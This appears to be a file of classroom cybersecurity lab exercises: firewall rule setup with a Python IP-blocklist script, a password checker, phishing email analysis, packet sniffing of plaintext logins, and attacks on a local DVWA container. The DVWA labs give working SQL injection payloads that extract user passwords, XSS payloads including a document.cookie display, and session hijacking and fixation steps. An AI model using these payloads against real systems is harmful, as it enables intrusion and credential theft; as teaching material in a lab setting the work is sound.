@@ -1,0 +1,479 @@
+    LAB EXERCISE 1 – BASIC FIREWALL CONFIGURATION
+
+
+    PART 1 — MANUAL FIREWALL CONFIGURATION (INBOUND RULE)
+
+    STEP 1: Open Windows Defender Firewall with Advanced Security.
+    STEP 2: In the left panel, click “Inbound Rules”.
+    STEP 3: In the right panel, click “New Rule”.
+    STEP 4: Select “Custom” → click Next.
+    STEP 5: For Programs: choose “All Programs” → Next.
+    STEP 6: For Protocol and Ports: keep all default settings → Next.
+    STEP 7: For Scope:
+            - Under “Remote IP Address”, select “These IP addresses”.
+            - Click “Add”.
+            - Enter the IP address you want to block (example: 1.2.3.4).
+            - Click OK → Next.
+    STEP 8: For Action:
+            - Select “Block the connection” → Next.
+    STEP 9: For Profile:
+            - Select Domain, Private, Public → Next.
+    STEP 10: For Name:
+            - Enter any name, e.g., Manual_Block_IP.
+            - Click Finish.
+    RESULT: This inbound rule now blocks ALL incoming traffic from that specific IP address.
+
+
+
+    PART 2 — AUTOMATED FIREWALL CONFIGURATION USING PYTHON
+
+
+    import requests, csv, subprocess
+
+    response = requests.get(
+        "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+    ).text
+
+    rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+    subprocess.run(["PowerShell", "-Command", rule])
+
+    mycsv = csv.reader(
+        filter(lambda x: not x.startswith("#"), response.splitlines())
+    )
+
+    for row in mycsv:
+        ip = row[1]
+        if ip != "dst_ip":
+            print("Added Rule to block:", ip)
+            rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+            subprocess.run(["PowerShell", "-Command", rule])
+
+
+
+    PART 3 — EXECUTION STEPS FOR RUNNING THE PYTHON SCRIPT
+
+    STEP 1: Open Command Prompt → Run as Administrator.
+            (Firewall rule creation requires admin privileges.)
+
+    STEP 2: Navigate to the folder containing firewall.py
+            Example:
+            cd C:\Users\YourName\Desktop
+
+    STEP 3: Check Python installation:
+            python --version
+
+    STEP 4: Install required library (if not installed):
+            python -m pip install requests
+
+    STEP 5: Run the program:
+            python firewall.py
+
+    STEP 6: Observe output:
+            Added Rule to block: <IP>
+            Added Rule to block: <another IP>
+
+            PowerShell should also show “OK” for successful rule creation.
+
+    STEP 7: Verify the rules manually:
+            - Open Windows Defender Firewall with Advanced Security
+            - Go to Outbound Rules
+            - Search for rule name: BadIP
+            - You should see multiple blocked IPs listed.
+
+---------------------------------------------------------------------------------------------------
+  
+
+LAB EXERCISE – PASSWORD STRENGTH TESTING USING PYTHON
+
+
+import re
+
+    def check_password_strength(password):
+        if len(password) < 8:
+            return "Weak: Password must be at least 8 characters long."
+
+        if not any(char.isdigit() for char in password):
+            return "Weak: Password must include at least one number."
+
+        if not any(char.isupper() for char in password):
+            return "Weak: Password must include at least one uppercase letter."
+
+        if not any(char.islower() for char in password):
+            return "Weak: Password must include at least one lowercase letter."
+
+        if not re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):
+            return "Medium: Add special characters to make your password stronger."
+
+        return "Strong: Your password is secure!"
+
+
+    def password_checker():
+        print("Welcome to the Password Strength Checker!")
+
+        while True:
+            password = input("\nEnter your password (or type 'exit' to quit): ")
+
+            if password.lower() == "exit":
+                print("Thank you for using the Password Strength Checker! Goodbye!")
+                break
+
+            result = check_password_strength(password)
+            print(result)
+
+
+    if __name__ == "__main__":
+        password_checker()
+
+---------------------------------------------------------------------------------------------------
+
+LAB: Analyzing Phishing Emails
+
+1. Download the sample email file:
+       2020-05-05-phishing-email-example-01.eml
+
+    2. Open any Online EML Analyzer.
+
+    3. Upload the .eml file into the analyzer.
+
+    4. From the EML Analyzer results, note:
+       - Sender email: sues@nnwifi.com
+       - Domain: nnwifi.com
+       - Sender IP: 94.100.31.27
+       - SPF result: Failed
+       - Message-ID: Missing
+       - Suspicious URL:
+         https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net
+
+    5. Open VirusTotal (virustotal.com)
+
+    6. Enter the sender IP: 94.100.31.27
+
+    7. Note detection:
+       - 1/93 vendors flagged as malicious
+
+
+
+---------------------------------------------------------------------------------------------------
+
+
+LAB: Packet Sniffing & Network Traffic Analysis
+
+STEP 1:
+    Open Kali Linux (in VirtualBox).
+
+    STEP 2:
+    Open Terminal.
+
+    STEP 3:
+    Start local HTTP server on port 8080:
+        python3 -m http.server 8080
+
+    STEP 4:
+    Open another terminal and start capturing packets:
+        sudo tcpdump -i any -w capture.pcap port 8080
+
+    STEP 5:
+    Open Firefox → visit:
+        http://localhost:8080
+    Refresh page to generate traffic.
+
+    STEP 6:
+    Stop tcpdump (Ctrl + C).
+    Packet file saved as: capture.pcap
+
+    STEP 7:
+    Open File Manager → find capture.pcap in Home directory.
+
+    STEP 8:
+    Double-click capture.pcap → it opens in Wireshark.
+
+    STEP 9:
+    Filter POST login packets in Wireshark:
+        http.request.method == "POST"
+
+    STEP 10:
+    Click any POST packet.
+    View:
+        - Browser details (OS, browser version, language)
+        - URLs visited
+        - If login form submitted → username & password visible in plain text.
+
+    FINAL NOTE:
+    HTTP traffic is unencrypted → sensitive data is exposed.
+
+
+---------------------------------------------------------------------------------------------------
+
+
+ LAB: SQL Injection Attack (DVWA)
+
+SETUP (USING DOCKER):
+
+    STEP 1:
+    Pull DVWA Docker image:
+        sudo docker pull vulnerables/web-dvwa
+
+    STEP 2:
+    Start DVWA container:
+        sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+    STEP 3:
+    Open DVWA in browser:
+        http://127.0.0.1
+    Login:
+        admin / password
+
+    STEP 4:
+    Go to:
+        Setup / Reset DB
+    Click:
+        Create / Reset Database
+
+    STEP 5:
+    Set DVWA Security Level to LOW:
+        DVWA Security → Security Level → Low → Submit
+
+
+    SQL INJECTION ATTACK:
+
+    STEP 6:
+    Navigate to:
+        DVWA → Vulnerabilities → SQL Injection
+
+    STEP 7:
+    Test normal input:
+        1
+
+    STEP 8:
+    Authentication bypass:
+        1' OR '1'='1
+    → Shows all users → SQLi confirmed.
+
+
+    ENUMERATION:
+
+    STEP 9:
+    Find number of columns:
+        1' ORDER BY 1-- -
+        1' ORDER BY 2-- -
+        1' ORDER BY 3-- -
+    (Stop when error appears; usually 2 columns)
+
+    STEP 10:
+    UNION test:
+        1' UNION SELECT 1,2-- -
+
+    STEP 11:
+    Extract database name:
+        1' UNION SELECT database(),2-- -
+
+    STEP 12:
+    Extract table names:
+        1' UNION SELECT table_name,2
+        FROM information_schema.tables
+        WHERE table_schema = database()-- -
+
+    STEP 13:
+    Extract column names:
+        1' UNION SELECT column_name,2
+        FROM information_schema.columns
+        WHERE table_name='users'-- -
+
+    STEP 14:
+    Extract usernames & passwords:
+        1' UNION SELECT user,password FROM users-- -
+
+
+
+---------------------------------------------------------------------------------------------------
+
+
+LAB: XSS Exploitation using DVWA + Burp Suite
+
+STEP 1:
+    Start DVWA container:
+        sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+    STEP 2:
+    Open browser → visit:
+        http://localhost/login.php
+    Login:
+        admin / password
+
+    STEP 3:
+    Go to Setup / Reset DB → click:
+        Create / Reset Database
+
+    STEP 4:
+    Set DVWA Security:
+        DVWA Security → Low → Submit
+
+
+    REFLECTED XSS:
+
+    STEP 5:
+    Navigate to:
+        XSS (Reflected)
+    Enter payload:
+        <script>alert('XSS')</script>
+    Submit → popup appears.
+
+
+    STORED XSS:
+
+    STEP 6:
+    Navigate to:
+        XSS (Stored)
+    Name:
+        Hacked
+    Message:
+        <script>alert('Stored XSS')</script>
+    Submit → popup appears on every refresh.
+
+
+    DOM-BASED XSS (CORRECTED STEPS):
+
+    STEP 7:
+    Navigate to:
+        XSS (DOM)
+
+    STEP 8:
+    Right-click the webpage → select:
+        View Page Source
+
+    STEP 9:
+    Press CTRL + F → search for:
+        document.write
+
+    STEP 10:
+    Observe that the page uses document.write() to insert content based on URL input,
+    confirming it can be exploited through the URL fragment.
+
+    STEP 11:
+    Inject DOM XSS payload by appending it to the URL:
+        #<script>alert('DOM XSS')</script>
+
+        Example full URL:
+        http://localhost/vulnerabilities/xss_d/?default=English#<script>alert('DOM XSS')</script>
+
+    STEP 12:
+    Press Enter → JavaScript executes → popup appears.
+
+
+    COOKIE THEFT DEMO:
+
+    STEP 13:
+    In Stored XSS message field enter:
+        <script>alert(document.cookie)</script>
+    This displays the session cookie.
+
+---------------------------------------------------------------------------------------------------
+
+
+LAB EXPERIMENT: Authentication & Session Management
+
+
+
+PART A: LAUNCH DVWA
+
+1. Open Terminal and start services:
+   STEP 1:
+    Pull DVWA Docker image:
+        sudo docker pull vulnerables/web-dvwa
+
+    STEP 2:
+    Start DVWA container:
+        sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+    STEP 3:
+    Open DVWA in browser:
+        http://127.0.0.1
+
+
+3. Login with default credentials:
+   Username: admin
+   Password: password
+
+4. Go to DVWA Security → Set Security Level to LOW → Submit
+
+
+PART B: TESTING AUTHENTICATION WEAKNESSES
+
+Experiment 1: Weak Password Authentication
+1. Go to DVWA → Vulnerabilities → Brute Force
+2. Enter:
+   Username: admin
+   Password: password
+3. Click Login
+4. Observation: Successful login → Weak password vulnerability confirmed.
+
+Experiment 2: Manual Brute Force Attack
+1. Stay in Brute Force module.
+2. Keep Username = admin (do not change).
+3. Try passwords one by one:
+   Attempt 1: Password = admin → Login (fails)
+   Attempt 2: Password = 123456 → Login (fails)
+   Attempt 3: Password = password → Login (SUCCESS)
+4. Observation:
+   - No account lockout
+   - Unlimited login attempts allowed
+   - Brute force vulnerability present
+
+
+PART C: TESTING SESSION MANAGEMENT VULNERABILITIES
+
+Experiment 3: Session ID Analysis
+1. Login to DVWA as admin.
+2. Right-click anywhere → Inspect → Storage → Cookies → http://127.0.0.1
+3. Note the PHPSESSID value (example: 5f6194766020dca2c906358cbdd2941b)
+4. Observation: Session ID is visible in plain text and not encrypted.
+
+Experiment 4: Session Hijacking
+Prerequisites: Security Level = LOW, already logged in as admin in normal Firefox window.
+
+Step-by-Step:
+1. In current (victim) window, copy PHPSESSID value (right-click → Copy).
+2. Press Ctrl + Shift + P to open Private Browsing window (attacker window).
+3. In private window, go to http://127.0.0.1/dvwa
+4. Right-click → Inspect → Storage → Cookies → http://127.0.0.1
+5. Find PHPSESSID → Replace its value with the copied victim PHPSESSID → Press Enter.
+6. Refresh the page (F5).
+7. Result: You are now logged in as admin WITHOUT entering username/password → Session Hijacking successful.
+
+Experiment 5: Session Fixation
+Prerequisites: Security Level = LOW, use ONLY ONE normal browser window.
+
+Step-by-Step:
+1. Open Firefox → go to http://127.0.0.1/dvwa (do NOT login yet).
+2. Inspect → Storage → Cookies → Note PHPSESSID (before login).
+3. WITHOUT closing browser or refreshing, login as:
+   Username: admin
+   Password: password
+4. Again check PHPSESSID (after login).
+5. Observation (LOW level):
+   - PHPSESSID value remains THE SAME before and after login
+   - Session Fixation vulnerability confirmed.
+
+   (Note: In HIGH/IMPOSSIBLE level, session ID changes after login → secure.)
+
+Experiment 6: Improper Logout / Session Reuse After Logout
+Prerequisites: Security Level = LOW.
+
+Step-by-Step:
+1. Login normally as admin.
+2. Copy current PHPSESSID.
+3. Click Logout (top right).
+4. Open Private Window (Ctrl + Shift + P).
+5. Go to http://127.0.0.1/dvwa
+6. Inspect → Storage → Cookies → Paste the OLD PHPSESSID → Press Enter.
+7. In address bar, directly visit:
+   http://127.0.0.1/dvwa/index.php
+   OR
+   http://127.0.0.1/dvwa/vulnerabilities/brute/
+   (Do NOT click Login or enter credentials)
+8. Result: You are logged in again using the old session ID → Logout did NOT destroy the session.
+
+
+---------------------------------------------------------------------------------------------------
+
+
